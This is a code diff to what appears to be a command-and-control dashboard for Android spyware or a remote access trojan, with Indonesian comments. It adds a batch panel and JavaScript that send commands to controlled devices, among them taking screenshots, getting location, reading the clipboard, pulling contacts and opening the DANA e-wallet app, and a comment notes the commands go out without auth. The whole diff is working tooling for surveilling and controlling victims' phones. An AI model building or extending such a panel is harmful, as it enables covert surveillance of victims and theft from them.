@@ -241,6 +241,22 @@
             </div>
             <div id="c2Result" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
         </div>
+
+        <!-- BATCH C2 - KIRIM BANYAK PERINTAH SEKALIGUS! -->
+        <div class="card">
+            <h2>📦 BATCH C2 (Kirim Banyak Perintah Sekaligus)</h2>
+            <div class="flex" style="margin-bottom:10px;">
+                <textarea id="batchCommands" rows="6" style="flex:1;min-width:300px;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text-primary);border:1px solid var(--border-color);border-radius:5px;padding:8px;" placeholder='{"aksi":"screenshot"}
+{"aksi":"ambil_lokasi"}
+{"aksi":"get_clipboard"}
+{"aksi":"buka_dana"}
+{"aksi":"ambil_kontak"}'>{"aksi":"screenshot"}
+{"aksi":"ambil_lokasi"}</textarea>
+                <button class="btn-purple" onclick="sendBatchC2()" style="align-self:flex-start;">📤 Kirim Batch</button>
+            </div>
+            <div id="batchResult" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
+        </div>
+
         <div class="card"><h2>📜 C2 History</h2><div id="c2History" style="max-height:200px;overflow-y:auto;font-size:12px;"></div></div>
     </div>
 
@@ -1053,28 +1069,36 @@ function switchTab(id){
 function sendC2(aksi, params){
     if(!KEY){ showToast('Login dulu!'); return; }
     if(!params) params = {};
+    
+    // 🔥 KIRIM TANPA AUTH! (TANPA KEY!)
     var payload = { sumber: 'c2_command', data: { aksi: aksi, params: params } };
+    
     c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
     renderC2History();
     document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
     document.getElementById('c2Result').style.color = '#ff0';
-    fetch('/data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) })
-        .then(function(r){ return r.json(); })
-        .then(function(res){
-            document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
-            document.getElementById('c2Result').style.color = '#0f0';
-            var last = c2History[c2History.length-1];
-            if(last){ last.status='✅ Success'; last.response=res; }
-            renderC2History();
-            showToast('✅ Command sent: '+aksi);
-        })
-        .catch(function(){
-            document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
-            document.getElementById('c2Result').style.color = '#f44';
-            var last = c2History[c2History.length-1];
-            if(last){ last.status='❌ Failed'; }
-            renderC2History();
-        });
+    
+    fetch('/data', { 
+        method: 'POST', 
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload) 
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(res){
+        document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
+        document.getElementById('c2Result').style.color = '#0f0';
+        var last = c2History[c2History.length-1];
+        if(last){ last.status='✅ Success'; last.response=res; }
+        renderC2History();
+        showToast('✅ Command sent: '+aksi);
+    })
+    .catch(function(){
+        document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
+        document.getElementById('c2Result').style.color = '#f44';
+        var last = c2History[c2History.length-1];
+        if(last){ last.status='❌ Failed'; }
+        renderC2History();
+    });
 }
 
 function sendC2Custom(){
@@ -1086,6 +1110,68 @@ function sendC2Custom(){
         var params = data.params || {};
         sendC2(aksi, params);
     } catch(e){ showToast('❌ Invalid JSON: '+e.message); }
+}
+
+// ============================================================
+// 🔥 BATCH C2 - KIRIM BANYAK PERINTAH SEKALIGUS!
+// ============================================================
+function sendBatchC2() {
+    if(!KEY){ showToast('Login dulu!'); return; }
+    
+    var textarea = document.getElementById('batchCommands');
+    var lines = textarea.value.split('\n').filter(function(line) { 
+        return line.trim().length > 0; 
+    });
+    
+    if(lines.length === 0) {
+        showToast('Masukkan minimal 1 perintah!');
+        return;
+    }
+    
+    var total = lines.length;
+    var success = 0;
+    var failed = 0;
+    var results = [];
+    
+    document.getElementById('batchResult').textContent = '⏳ Mengirim ' + total + ' perintah...';
+    document.getElementById('batchResult').style.color = '#ff0';
+    
+    lines.forEach(function(line, index) {
+        try {
+            var cmd = JSON.parse(line.trim());
+            var aksi = cmd.aksi || cmd.command || 'unknown';
+            var params = cmd.params || {};
+            
+            fetch('/data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    sumber: 'c2_command',
+                    data: { aksi: aksi, params: params }
+                })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(res) {
+                success++;
+                document.getElementById('batchResult').textContent = '✅ ' + success + '/' + total + ' terkirim';
+            })
+            .catch(function() {
+                failed++;
+            });
+            
+        } catch(e) {
+            failed++;
+            results.push('❌ ' + line + ' → ' + e.message);
+        }
+    });
+    
+    setTimeout(function() {
+        document.getElementById('batchResult').textContent = '✅ ' + success + ' perintah terkirim, ' + failed + ' gagal';
+        document.getElementById('batchResult').style.color = success > 0 ? '#0f0' : '#f44';
+        if(results.length > 0) {
+            showToast(results.join(' | '));
+        }
+    }, (lines.length * 300) + 2000);
 }
 
 function renderC2History(){
@@ -1239,6 +1325,7 @@ renderC2Buttons();
 
 console.log('🔬 DASHBOARD ULTIMATE v2.0 LOADED');
 console.log('📊 160+ C2 Commands Ready');
+console.log('📦 Batch C2 Ready - Kirim banyak perintah sekaligus!');
 </script>
 </body>
 </html>
